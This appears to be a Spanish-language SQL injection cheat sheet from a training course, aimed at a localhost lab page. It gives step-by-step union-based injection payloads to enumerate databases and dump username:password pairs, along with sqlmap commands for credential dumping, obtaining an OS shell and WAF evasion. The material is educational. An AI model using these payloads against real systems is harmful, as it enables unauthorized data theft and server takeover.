---

### 💥 **SQL Injection Cheat Sheet** 💥

---
---
#### 📝 **¿Qué es SQL Injection?**  
La **inyección SQL (SQLi)** es una vulnerabilidad que permite al atacante manipular consultas SQL realizadas por la aplicación para acceder o modificar datos de la base de datos.  
El atacante puede enviar consultas maliciosas a través de parámetros de entrada, explotando así la aplicación vulnerable.  

---

## 🔍 **Fase 1: Descubrimiento de Columnas con `ORDER BY`**  

Para determinar el número de columnas en la consulta SQL, se usa la cláusula **`ORDER BY`**:  
```sql
id=3' order by 100-- -
```
- **Si no da error:** El número de columnas es mayor o igual a 100.  
- **Si da error:** El número de columnas es menor a 100.  
- **Ajustar el número hasta encontrar el límite exacto.**  

---

## 🔗 **Fase 2: Exploración con `UNION SELECT`**  

Una vez conocida la cantidad de columnas, intentamos combinar los resultados de la consulta original con los nuestros:  
```sql
id=3' union select 1--
```
Esto debería mostrar el valor `1` en la columna inyectada si la consulta es exitosa.  

---

## 🗃️ **Fase 3: Enumeración de Bases de Datos**  

Para listar todas las bases de datos:  
```sql
id=32' union select schema_name from information_schema.schemata-- -
```
- **`schema_name`:** Columna que contiene los nombres de las bases de datos.  
- **`information_schema`:** Esquema especial que almacena metadatos.  
- **`schemata`:** Tabla que contiene los nombres de las bases de datos.  

---

## 📝 **Concatenación con `group_concat()`**  
Si el resultado está limitado, usamos la función **`group_concat()`**:  
```sql
id=32' union select group_concat(schema_name) from information_schema.schemata-- -
```
También podemos usar **`LIMIT`** para obtener resultados específicos:  
```sql
id=32' union select schema_name from information_schema.schemata limit 0,1-- -
```

---

## 🗂️ **Fase 4: Enumeración de Tablas**  

Para listar todas las tablas dentro de una base de datos:  
```sql
id=32' union select group_concat(table_name) from information_schema.tables where table_schema='Hack4u'-- -
```

---

## 🧱 **Fase 5: Enumeración de Columnas**  

Para listar todas las columnas dentro de una tabla específica:  
```sql
id=32' union select group_concat(column_name) from information_schema.columns where table_schema='Hack4u' and table_name='users'-- -
```

---

## 🔑 **Fase 6: Extracción de Datos**  

Obtener los usuarios almacenados:  
```sql
id=32' union select group_concat(username) from users-- -
```

Obtener usuarios y contraseñas en conjunto:  
```sql
id=32' union select group_concat(username,':',password) from users-- -
```

---

## 📝 **Aclaraciones Importantes**  

- **ORDER BY:** El número representa el total de columnas. Ejemplo:  
  ```sql
  id=1' order by 2-- -
  ```
- **UNION SELECT:** El número de columnas en el `SELECT` debe coincidir con la consulta original. Ejemplo:  
  ```sql
  id=1' union select 1,2-- -
  ```
- **Para verificar cuál columna refleja el valor, prueba con valores no válidos:**  
  ```sql
  id=-1' union select 1,2-- -
  ```
  - Una vez identificada la columna que refleja el resultado, inyecta comandos en esa posición:  
    ```sql
    id=-1' union select database(),2-- -
    ```

---

## 🛠️ **Automatización con SQLMap**  

### 🔎 **Enumeración de Bases de Datos:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbs --cookie "PHPSESSID=8123791283"
```

### 🗃️ **Listar Tablas de una Base de Datos:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u --tables
```

### 📝 **Listar Columnas de una Tabla:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u -T users --columns
```

### 🔐 **Dumpear Información Sensible:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --dbms mysql --batch -D Hack4u -T users -C username,password --dump
```

### 🖥️ **Obtener Shell Remota:**
```bash
sqlmap -u 'http://localhost/searchUsers.php?id=1' --os-shell
```

---

## ⚙️ **Parámetros Útiles de SQLMap**
| Parámetro    | Descripción                                                         |
|-------------|---------------------------------------------------------------------|
| `--dbs`     | Lista todas las bases de datos.                                      |
| `--tables`  | Lista todas las tablas de una base de datos.                         |
| `--columns` | Lista todas las columnas de una tabla.                               |
| `--dump`    | Extrae los datos de la tabla especificada.                           |
| `--os-shell`| Intenta obtener una consola del sistema operativo.                   |
| `--risk`    | Nivel de riesgo (1-3).                                                |
| `--level`   | Nivel de pruebas (1-5).                                               |
| `--tech`    | Especifica técnicas de inyección.                                     |
| `--tamper`  | Usa scripts de evasión para eludir filtros WAF/IDS.                    |

---

